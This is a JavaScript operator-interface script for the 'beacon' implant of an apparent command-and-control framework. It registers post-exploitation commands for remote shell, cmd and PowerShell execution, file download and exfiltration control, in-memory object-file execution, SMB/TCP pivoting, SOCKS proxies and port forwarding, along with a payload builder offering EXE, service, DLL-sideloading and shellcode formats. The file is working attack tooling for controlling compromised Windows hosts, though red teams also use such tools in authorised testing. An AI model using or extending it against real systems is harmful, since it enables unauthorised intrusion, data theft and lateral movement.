/// Beacon agent

let exit_thread_action  = menu.create_action("Terminate thread",  function(value) { value.forEach(v => ax.execute_command(v, "terminate thread")) });
let exit_process_action = menu.create_action("Terminate process", function(value) { value.forEach(v => ax.execute_command(v, "terminate process")) });
let exit_menu = menu.create_menu("Exit");
exit_menu.addItem(exit_thread_action)
exit_menu.addItem(exit_process_action)
menu.add_session_agent(exit_menu, ["beacon"])


let file_browser_action    = menu.create_action("File Browser",    function(value) { value.forEach(v => ax.open_browser_files(v)) });
let process_browser_action = menu.create_action("Process Browser", function(value) { value.forEach(v => ax.open_browser_process(v)) });
let shell_browser_action   = menu.create_action("Remote Shell",    function(value) { value.forEach(v => ax.open_remote_shell(v)) });
menu.add_session_browser(file_browser_action, ["beacon"])
menu.add_session_browser(process_browser_action, ["beacon"])
menu.add_session_browser(shell_browser_action, ["beacon"])


let tunnel_access_action = menu.create_action("Create Tunnel", function(value) { ax.open_access_tunnel(value[0], true, true, true, true) });
menu.add_session_access(tunnel_access_action, ["beacon"])


let execute_action = menu.create_action("Execute", function(files_list) {
    file = files_list[0];
    if(file.type != "file"){ return; }

    let label_bin = form.create_label("Binary:");
    let text_bin = form.create_textline(file.path + file.name);
    text_bin.setEnabled(false);
    let label_args = form.create_label("Arguments:");
    let text_args = form.create_textline();
    let output_check = form.create_check("Show command output");
    output_check.setChecked(true);

    let layout = form.create_gridlayout();
    layout.addWidget(label_bin, 0, 0, 1, 1);
    layout.addWidget(text_bin, 0, 1, 1, 1);
    layout.addWidget(label_args, 1, 0, 1, 1);
    layout.addWidget(text_args, 1, 1, 1, 1);
    layout.addWidget(output_check, 2, 1, 1, 1);

    let dialog = form.create_dialog("Execute binary");
    dialog.setSize(600, 100);
    dialog.setLayout(layout);
    if ( dialog.exec() == true )
    {
        let command = "ps run ";
        if( output_check.isChecked()) { command += "-o "; }
        command += text_bin.text() + " " + text_args.text();

        ax.execute_command(file.agent_id, command);
    }
});
let download_action = menu.create_action("Download", function(files_list) {
    files_list.forEach((file) => {
        if(file.type == "file") {
            ax.execute_command(file.agent_id, "download " + file.path + file.name);
        }
    });
});
let remove_action = menu.create_action("Remove", function(files_list) {
    files_list.forEach(file => ax.execute_command(file.agent_id, "rm " + file.path + file.name))
});
menu.add_filebrowser(execute_action, ["beacon"])
menu.add_filebrowser(download_action, ["beacon"])
menu.add_filebrowser(remove_action, ["beacon"])




let download_stop_action = menu.create_action("Pause", function(files_list) { files_list.forEach( file => ax.execute_command(file.agent_id, "exfil stop " + file.file_id) ) });
let download_start_action = menu.create_action("Resume", function(files_list) { files_list.forEach( file => ax.execute_command(file.agent_id, "exfil start " + file.file_id) ) });
let download_separator1 = menu.create_separator()
let download_cancel_action = menu.create_action("Cancel", function(files_list) { files_list.forEach( file => ax.execute_command(file.agent_id, "exfil cancel " + file.file_id) ) });
menu.add_downloads_running(download_stop_action, ["beacon"])
menu.add_downloads_running(download_start_action, ["beacon"])
menu.add_downloads_running(download_separator1, ["beacon"])
menu.add_downloads_running(download_cancel_action, ["beacon"])


let job_stop_action = menu.create_action("Stop job", function(tasks_list) {
    tasks_list.forEach((task) => {
        if(task.type == "JOB" && task.state == "Running") {
            ax.execute_command(task.agent_id, "jobs kill " + task.task_id);
        }
    });
});
menu.add_tasks_job(job_stop_action, ["beacon"])


var event_disks_action = function(id) {
    ax.execute_browser(id, "disks");
}
event.on_filebrowser_disks(event_disks_action, ["beacon"]);

var event_files_action = function(id, path) {
    ax.execute_browser(id, "ls " + path);
}
event.on_filebrowser_list(event_files_action, ["beacon"]);

var event_upload_action = function(id, path, filepath) {
    let filename = ax.file_basename(filepath);
    ax.execute_browser(id, "upload " + filepath + " " + path + filename);
}
event.on_filebrowser_upload(event_upload_action, ["beacon"]);

var event_process_action = function(id) {
    ax.execute_browser(id, "ps list");
}
event.on_processbrowser_list(event_process_action, ["beacon"]);


function RegisterCommands(listenerType)
{
    let cmd_cat = ax.create_command("cat", "Read first 2048 bytes of the specified file", "cat C:\\file.exe", "Task: read file");
    cmd_cat.addArgString("path", true);

    let cmd_cd = ax.create_command("cd", "Change current working directory", "cd C:\\Windows", "Task: change working directory");
    cmd_cd.addArgString("path", true);

    let cmd_cp = ax.create_command("cp", "Copy file", "cp src.txt dst.txt", "Task: copy file");
    cmd_cp.addArgString("src", true);
    cmd_cp.addArgString("dst", true);

    let cmd_disks = ax.create_command("disks", "Lists mounted drives on current system", "disks", "Task: show mounted disks");

    let cmd_download = ax.create_command("download", "Download a file", "download C:\\Temp\\file.txt", "Task: download file");
    cmd_download.addArgString("file", true);

    let _cmd_execute_bof = ax.create_command("bof", "Execute Beacon Object File", "execute bof /home/user/whoami.o", "Task: execute BOF");
    _cmd_execute_bof.addArgFile("bof", true, "Path to object file");
    _cmd_execute_bof.addArgString("param_data", false);
    let cmd_execute = ax.create_command("execute", "Execute [bof] in the current process's memory");
    cmd_execute.addSubCommands([_cmd_execute_bof])

    let _cmd_exfil_cancel = ax.create_command("cancel", "Cancels a download", "exfil cancel 1a2b3c4d");
    _cmd_exfil_cancel.addArgString("file_id", true);
    let _cmd_exfil_start = ax.create_command("start", "Resumes a download that's has been stoped", "exfil start 1a2b3c4d");
    _cmd_exfil_start.addArgString("file_id", true);
    let _cmd_exfil_stop = ax.create_command("stop", "Stops a download that's in-progress", "exfil stop 1a2b3c4d");
    _cmd_exfil_stop.addArgString("file_id", true);
    let cmd_exfil = ax.create_command("exfil", "Manage current downloads");
    cmd_exfil.addSubCommands([_cmd_exfil_cancel, _cmd_exfil_start, _cmd_exfil_stop])

    let cmd_getuid = ax.create_command("getuid", "Prints the User ID associated with the current token", "getuid", "Task: get username of current token");

    let _cmd_job_list = ax.create_command("list", "List of jobs", "jobs list", "Task: show jobs");
    let _cmd_job_kill = ax.create_command("kill", "Kill a specified job", "jobs kill 1a2b3c4d", "Task: kill job");
    _cmd_job_kill.addArgString("task_id", true);
    let cmd_job = ax.create_command("jobs", "Long-running tasks manager");
    cmd_job.addSubCommands([_cmd_job_list, _cmd_job_kill]);

    let _cmd_link_smb = ax.create_command("smb", "Connect to an SMB agent and re-establish control of it", "link smb 192.168.1.2 pipe_a1b2", "Task: Connect to an SMB agent");
    _cmd_link_smb.addArgString("target", true);
    _cmd_link_smb.addArgString("pipename", true);
    let _cmd_link_tcp = ax.create_command("tcp", "Connect to an TCP agent and re-establish control of it", "link tcp 192.168.1.2 8888", "Task: Connect to an TCP agent");
    _cmd_link_tcp.addArgString("target", true);
    _cmd_link_tcp.addArgInt("port", true);
    let cmd_link = ax.create_command("link", "Connect to an pivot agents");
    cmd_link.addSubCommands([_cmd_link_smb, _cmd_link_tcp]);

    let cmd_ls = ax.create_command("ls", "Lists files in a folder", "ls C:\\Windows", "Task: list of files in a folder");
    cmd_ls.addArgString("directory", "", ".");

    let _cmd_lportfwd_start = ax.create_command("start", "Start local port forwarding from server via agent", "lportfwd start 127.0.0.1 8080 192.168.1.1 8080");
    _cmd_lportfwd_start.addArgString("lhost", "Listening interface address on server", "0.0.0.0");
    _cmd_lportfwd_start.addArgInt("lport", true, "Listen port on server");
    _cmd_lportfwd_start.addArgString("fwdhost", true, "Remote forwarding address");
    _cmd_lportfwd_start.addArgInt("fwdport", true, "Remote forwarding port");
    let _cmd_lportfwd_stop = ax.create_command("stop", "Stop local port forwarding", "lportfwd stop 8080");
    _cmd_lportfwd_stop.addArgInt("lport", true);
    let cmd_lportfwd = ax.create_command("lportfwd", "Managing local port forwarding");
    cmd_lportfwd.addSubCommands([_cmd_lportfwd_start, _cmd_lportfwd_stop]);

    let cmd_mv = ax.create_command("mv", "Move file", "mv src.txt dst.txt", "Task: move file");
    cmd_mv.addArgString("src", true);
    cmd_mv.addArgString("dst", true);

    let cmd_mkdir = ax.create_command("mkdir", "Make a directory", "mkdir C:\\Temp", "Task: make directory");
    cmd_mkdir.addArgString("path", true);

    let _cmd_profile_chunksize = ax.create_command("download.chunksize", "Change the exfiltrate data size for download request (default 128000)", "profile download.chunksize 512000", "Task: set download chunk size");
    _cmd_profile_chunksize.addArgInt("size", true);
    let _cmd_profile_killdate = ax.create_command("killdate", "Set the date and time for the beacon to stop working", "profile killdate 28.02.2030 12:34:00", "Task: set beacon's killdate");
    _cmd_profile_killdate.addArgString("datetime", true, "Datetime 'DD.MM.YYYY hh:mm:ss' in GMT format. Set 0 to disable the option");
    let _cmd_profile_workingtime = ax.create_command("workingtime", "Set the start and end time of the beacon activity", "profile workingtime 8:00-17:30", "Task: set beacon's workingtime");
    _cmd_profile_workingtime.addArgString("time", true, "Time interval in the format 'HH:mm(start)-HH:mm(end)'. Set 0 to disable the option");
    let cmd_profile = ax.create_command("profile", "Configure the payloads profile for current session");
    cmd_profile.addSubCommands([_cmd_profile_chunksize, _cmd_profile_killdate, _cmd_profile_workingtime]);

    let _cmd_ps_list = ax.create_command("list", "Show process list", "ps list", "Task: show process list");
    let _cmd_ps_kill = ax.create_command("kill", "Kill a process with a given PID", "ps kill 7865", "Task: kill process");
    _cmd_ps_kill.addArgInt("pid", true);
    let _cmd_ps_run = ax.create_command("run", "Run a program", "run -s cmd.exe /c whoami /all", "Task: create new process");
    _cmd_ps_run.addArgBool("-s", "Suspend process");
    _cmd_ps_run.addArgBool("-o", "Output to console");
    _cmd_ps_run.addArgString("args", true);
    let cmd_ps = ax.create_command("ps", "Process manager");
    cmd_ps.addSubCommands([_cmd_ps_list, _cmd_ps_kill, _cmd_ps_run]);

    let cmd_pwd = ax.create_command("pwd", "Print current working directory", "pwd", "Task: print working directory");

    let cmd_rev2self = ax.create_command("rev2self", "Revert to your original access token", "rev2self", "Task: revert token");

    let cmd_rm = ax.create_command("rm", "Remove a file or folder", "rm C:\\Temp\\file.txt", "Task: remove file or directory");
    cmd_rm.addArgString("path", true);

    let _cmd_rportfwd_start = ax.create_command("start", "Start remote port forwarding from agent via server", "rportfwd start 8080 10.10.10.14 8080");
    _cmd_rportfwd_start.addArgInt("lport", true, "Listen port on agent");
    _cmd_rportfwd_start.addArgString("fwdhost", true, "Remote forwarding address");
    _cmd_rportfwd_start.addArgInt("fwdport", true, "Remote forwarding port");
    let _cmd_rportfwd_stop = ax.create_command("stop", "Stop remote port forwarding", "rportfwd stop 8080");
    _cmd_rportfwd_stop.addArgInt("lport", true);
    let cmd_rportfwd = ax.create_command("rportfwd", "Managing remote port forwarding");
    cmd_rportfwd.addSubCommands([_cmd_rportfwd_start, _cmd_rportfwd_stop]);

    let cmd_sleep = ax.create_command("sleep", "Sets sleep time", "sleep 30m5s 10");
    cmd_sleep.addArgString("sleep", true, "Time in '%h%m%s' format or number of seconds");
    cmd_sleep.addArgInt("jitter", false, "Max random amount of time in % added to sleep");

    let _cmd_socks_start = ax.create_command("start", "Start a SOCKS(4a/5) proxy server and listen on a specified port", "socks start 1080 -auth user pass");
    _cmd_socks_start.addArgFlagString("-h", "address", "Listening interface address", "0.0.0.0");
    _cmd_socks_start.addArgInt("port", true, "Listen port");
    _cmd_socks_start.addArgBool("-socks4", "Use SOCKS4 proxy (Default SOCKS5)");
    _cmd_socks_start.addArgBool("-auth", "Enable User/Password authentication for SOCKS5");
    _cmd_socks_start.addArgString("username", false, "Username for SOCKS5 proxy");
    _cmd_socks_start.addArgString("password", false, "Password for SOCKS5 proxy");
    let _cmd_socks_stop = ax.create_command("stop", "Stop a SOCKS proxy server", "socks stop 1080");
    _cmd_socks_stop.addArgInt("port", true);
    let cmd_socks = ax.create_command("socks", "Managing socks tunnels");
    cmd_socks.addSubCommands([_cmd_socks_start, _cmd_socks_stop]);

    let _cmd_terminate_thread = ax.create_command("thread", "Terminate the main beacon thread (without terminating the process)", "terminate thread", "Task: terminate agent thread");
    let _cmd_terminate_process = ax.create_command("process", "Terminate the beacon process", "terminate process", "Task: terminate agent process");
    let cmd_terminate = ax.create_command("terminate", "Terminate the session");
    cmd_terminate.addSubCommands([_cmd_terminate_thread, _cmd_terminate_process]);

    let cmd_unlink = ax.create_command("unlink", "Disconnect from an pivot agent", "unlink 1a2b3c4d", "Task: disconnect from an pivot agent");
    cmd_unlink.addArgString("id", true);

    let cmd_upload = ax.create_command("upload", "Upload a file", "upload /tmp/file.txt C:\\Temp\\file.txt", "Task: upload file");
    cmd_upload.addArgFile("local_file", true);
    cmd_upload.addArgString("remote_path", false);

    /// Aliases

    let cmd_shell = ax.create_command("shell", "Execute command via cmd.exe", "shell whoami /all");
    cmd_shell.addArgString("cmd_params", true);
    cmd_shell.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
        let new_cmd = "ps run -o C:\\Windows\\System32\\cmd.exe /c " + parsed_json["cmd_params"];
        ax.execute_alias(id, cmdline, new_cmd);
    });

    let cmd_powershell = ax.create_command("powershell", "Execute command via powershell.exe", "powershell ls");
    cmd_powershell.addArgString("cmd_params", true);
    cmd_powershell.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
        let new_cmd = "ps run -o C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -c " + parsed_json["cmd_params"];
        ax.execute_alias(id, cmdline, new_cmd);
    });

    let cmd_interact = ax.create_command("interact", "Set 'sleep 0'", "interact");
    cmd_interact.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
        ax.execute_alias(id, cmdline, "sleep 0");
    });

    if(listenerType == "BeaconHTTP" || listenerType == "BeaconDNS") {
        let commands_external = ax.create_commands_group("beacon", [cmd_cat, cmd_cd, cmd_cp, cmd_disks, cmd_download, cmd_execute, cmd_exfil, cmd_getuid,
            cmd_job, cmd_link, cmd_ls, cmd_lportfwd, cmd_mv, cmd_mkdir, cmd_profile, cmd_ps, cmd_pwd, cmd_rev2self, cmd_rm, cmd_rportfwd, cmd_sleep,
            cmd_socks, cmd_terminate, cmd_unlink, cmd_upload, cmd_shell, cmd_powershell, cmd_interact] );

        return { commands_windows: commands_external }
    }
    else if (listenerType == "BeaconSMB" || listenerType == "BeaconTCP") {
        let commands_internal = ax.create_commands_group("beacon", [cmd_cat, cmd_cd, cmd_cp, cmd_disks, cmd_download, cmd_execute, cmd_exfil, cmd_getuid,
            cmd_job, cmd_link, cmd_ls, cmd_lportfwd, cmd_mv, cmd_mkdir, cmd_profile, cmd_ps, cmd_pwd, cmd_rev2self, cmd_rm, cmd_rportfwd,
            cmd_socks, cmd_terminate, cmd_unlink, cmd_upload, cmd_shell, cmd_powershell, cmd_interact] );

        return { commands_windows: commands_internal }
    }

    return ax.create_commands_group("none",[]);
}

function GenerateUI(listenerType)
{
    let spacer1 = form.create_vspacer();

    let labelArch = form.create_label("Arch:");
    let comboArch = form.create_combo()
    comboArch.addItems(["x64", "x86"]);

    let labelFormat = form.create_label("Format:");
    let comboFormat = form.create_combo()
    comboFormat.addItems(["Exe", "Service Exe", "DLL", "Shellcode"]);

    let labelSleep = form.create_label("Sleep (Jitter %):");
    let textSleep = form.create_textline("4s");
    textSleep.setPlaceholder("1h 2m 5s")
    let spinJitter = form.create_spin();
    spinJitter.setRange(0, 100);
    spinJitter.setValue(0);

    if(listenerType != "BeaconHTTP" && listenerType != "BeaconDNS") {
        labelSleep.setVisible(false);
        textSleep.setVisible(false);
        spinJitter.setVisible(false);
    }

    let labelDnsResolvers = form.create_label("DNS Resolvers:");
    let textDnsResolvers = form.create_textline("");
    textDnsResolvers.setPlaceholder("8.8.8.8,1.1.1.1,9.9.9.9");

    if(listenerType != "BeaconDNS") {
        labelDnsResolvers.setVisible(false);
        textDnsResolvers.setVisible(false);
    }

    let checkKilldate = form.create_check("Set 'killdate'");
    let dateKill = form.create_dateline("dd.MM.yyyy");
    let timeKill = form.create_timeline("HH:mm:ss");

    let checkWorkingTime = form.create_check("Set 'workingtime'");
    let timeStart = form.create_timeline("HH:mm");
    let timeFinish = form.create_timeline("HH:mm");

    let labelSvcName = form.create_label("Service Name:");
    labelSvcName.setVisible(false)
    let textSvcName = form.create_textline("AgentService");
    textSvcName.setVisible(false);

    let checkSideloading = form.create_check("Legit-DLL:");
    checkSideloading.setVisible(false);
    let sideloadingSelector = form.create_selector_file();
    sideloadingSelector.setVisible(false);

    let spacer2 = form.create_vspacer();

    let layout = form.create_gridlayout();
    layout.addWidget(spacer1, 0, 0, 1, 3);
    layout.addWidget(labelArch, 1, 0, 1, 1);
    layout.addWidget(comboArch, 1, 1, 1, 2);
    layout.addWidget(labelFormat, 2, 0, 1, 1);
    layout.addWidget(comboFormat, 2, 1, 1, 2);
    layout.addWidget(labelSleep, 3, 0, 1, 1);
    layout.addWidget(textSleep, 3, 1, 1, 1);
    layout.addWidget(spinJitter, 3, 2, 1, 1);
    layout.addWidget(labelDnsResolvers, 4, 0, 1, 1);
    layout.addWidget(textDnsResolvers, 4, 1, 1, 2);
    layout.addWidget(checkKilldate, 5, 0, 1, 1);
    layout.addWidget(dateKill, 5, 1, 1, 1);
    layout.addWidget(timeKill, 5, 2, 1, 1);
    layout.addWidget(checkWorkingTime, 6, 0, 1, 1);
    layout.addWidget(timeStart, 6, 1, 1, 1);
    layout.addWidget(timeFinish, 6, 2, 1, 1);
    layout.addWidget(labelSvcName, 7, 0, 1, 1);
    layout.addWidget(textSvcName, 7, 1, 1, 2);
    layout.addWidget(checkSideloading, 8, 0, 1, 1);
    layout.addWidget(sideloadingSelector, 8, 1, 1, 2);
    layout.addWidget(spacer2, 9, 0, 1, 3);

    form.connect(comboFormat, "currentTextChanged", function(text) {
        if(text == "Service Exe") {
            labelSvcName.setVisible(true)
            textSvcName.setVisible(true);
        } else {
            labelSvcName.setVisible(false)
            textSvcName.setVisible(false);
        }
        if(text == "DLL") {
            checkSideloading.setVisible(true);
            sideloadingSelector.setVisible(true);
        } else {
            checkSideloading.setVisible(false)
            sideloadingSelector.setVisible(false);
        }
    });

    let container = form.create_container()
    container.put("arch", comboArch)
    container.put("format", comboFormat)
    container.put("sleep", textSleep)
    container.put("jitter", spinJitter)
    container.put("dns_resolvers", textDnsResolvers)
    container.put("is_killdate", checkKilldate)
    container.put("kill_date", dateKill)
    container.put("kill_time", timeKill)
    container.put("is_workingtime", checkWorkingTime)
    container.put("start_time", timeStart)
    container.put("end_time", timeFinish)
    container.put("svcname", textSvcName)
    container.put("is_sideloading",checkSideloading)
    container.put("sideloading_content",sideloadingSelector)

    let panel = form.create_panel()
    panel.setLayout(layout)

    return {
        ui_panel: panel,
        ui_container: container,
        ui_height: 380,
        ui_width: 500
    }
}
